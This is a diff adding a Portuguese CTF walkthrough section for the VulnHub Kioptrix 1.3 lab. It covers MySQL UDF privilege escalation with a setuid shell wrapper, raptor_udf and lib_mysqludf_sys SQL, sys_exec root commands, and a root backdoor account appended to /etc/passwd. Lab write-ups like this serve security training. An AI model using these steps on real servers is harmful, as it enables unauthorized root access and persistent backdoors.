@@ -1,6 +1,6 @@
 ---
 title: "VulnHub - Kioptrix 1.3 #4"
-tags: [Linux,Easy,Web,Gobuster,SQLInjection,Linpeas,Brute Force]
+tags: [Linux,Easy,Web,Gobuster,SQLInjection,Linpeas,Brute Force,UDF]
 categories: VulnHub OSCP
 ---
 
@@ -232,6 +232,134 @@ ps -ef | grep mysql
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql3.png)
 
+Verificamos a versão do mysql
 
+```
+Ver 14.12 Distrib 5.0.51a
+```
 
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql4.png)
+
+## 1º Tentantiva - Falha
+
+Pesquisamos por exploits para ele, encontramos um exploit para UDF
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql5.png)
+
+https://www.exploit-db.com/exploits/1518
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql6.png)
+
+Criamos nosso `/tmp/setuid.c`
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system("/bin/bash");
+}
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/set.png)
+
+Compilamos e passamos ele para a máquina alvo, uma vez que não temos o gcc nela
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/set1.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/set1.png)
+
+Agora compilamos o exploit na nossa máquina, uma vez que não temos o gcc na máquina alvo
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/udf.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/udf1.png)
+
+Seguimos as instruções no exploitdb para explorar a vulnerabilidade
+
+```
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/udf2.png)
+
+Criamos a função que vai executar comandos
+
+```
+create function do_system returns integer soname 'raptor_udf2.so';
+select * from mysql.func;
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/udf3.png)
+
+Não conseguimos criar, vamos para o próximo exploit...
+
+## 2º Tentativa - Sucesso
+
+Agora com outro exploit vamos tentar escalar privilégio nessa máquina novamente
+
+Aqui está o guia que utilizei para escalação, a ideia aqui é explorar o UDF (User Defined Function)
+
+https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html
+
+http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/
+
+Seria necessário baixar a biblioteca necessária, contudo nessa máquina ela já está lá!
+
+Caso precise baixar em outras máquinas, aqui está o link
+
+https://github.com/mysqludf/lib_mysqludf_sys
+
+Com o comando `whereis lib_mysqludf_sys.so` encontramos a biblioteca
+
+/usr/lib/lib_mysqludf_sys.so
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/suc.png)
+
+Entramos no mysql como root, tentamos criar a função pra executar comandos, mas ela já está criada, então executamos um id e jogamos a saida para o arquivo /tmp/out, e ai está
+
+```
+mysql -h localhost -u root
+use mysql
+create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+select sys_exec('id > /tmp/out; chown john.john /tmp/out');
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss.png)
+
+Verificamos que o `setuid` não está com o setuid habilitado
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss1.png)
+
+Então habilitamos!
+
+```
+mysql -h localhost -u root
+use mysql
+select sys_exec('chmod u+s /tmp/setuid');
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss2.png)
+
+Outro modo é adicionar um usuário no `/etc/passwd`
+
+```
+select sys_exec('echo "hacker:aaDUnysmdx4Fo:0:0:hacker:/root:/bin/bash" >> /etc/passwd);
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss3.png)
+
+Agora entramos com ele
+
+hacker:senha
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss4.png)
+
+Pegamos a flag de root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/root.png)
 
